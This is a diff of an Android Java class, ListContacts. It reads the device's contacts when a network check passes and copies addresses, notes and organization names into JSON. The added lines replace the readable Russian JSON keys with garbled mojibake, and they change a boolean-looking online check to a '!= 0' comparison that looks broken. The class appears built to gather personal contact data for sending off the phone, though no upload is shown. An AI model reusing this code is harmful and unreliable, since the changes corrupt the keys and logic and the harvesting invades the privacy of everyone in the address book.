@@ -60,7 +60,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
 				null, null, null);
 
-		if (NetworkChangeReceiver.isOnline(mContext)) {
+		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
 				if (cur.getCount() > 0) {
 				while (cur.moveToNext()) {
 					complete = "0";
@@ -165,7 +165,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 									.getInt(addrCur
 											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
 							if (!sAdress.equals(" "))
-								jsonInfo.put("адрес",
+								jsonInfo.put("Г Г¤Г°ГҐГ±",
 										"(" + getTipeAddress(type) + ") "
 												+ sAdress.toString());
 						}
@@ -220,7 +220,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 										.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
 						if (note != null) {
 							if (!note.equals(""))
-								jsonInfo.put("заметка", note);
+								jsonInfo.put("Г§Г Г¬ГҐГІГЄГ ", note);
 						}
 					}
 					noteCur.close();
@@ -278,9 +278,9 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 
 						if (orgName != null) {
 							if (title == null)
-								jsonInfo.put("организация", orgName);
+								jsonInfo.put("Г®Г°ГЈГ Г­ГЁГ§Г Г¶ГЁГї", orgName);
 							else
-								jsonInfo.put("организация", orgName + " "
+								jsonInfo.put("Г®Г°ГЈГ Г­ГЁГ§Г Г¶ГЁГї", orgName + " "
 										+ title);
 						}
 					}
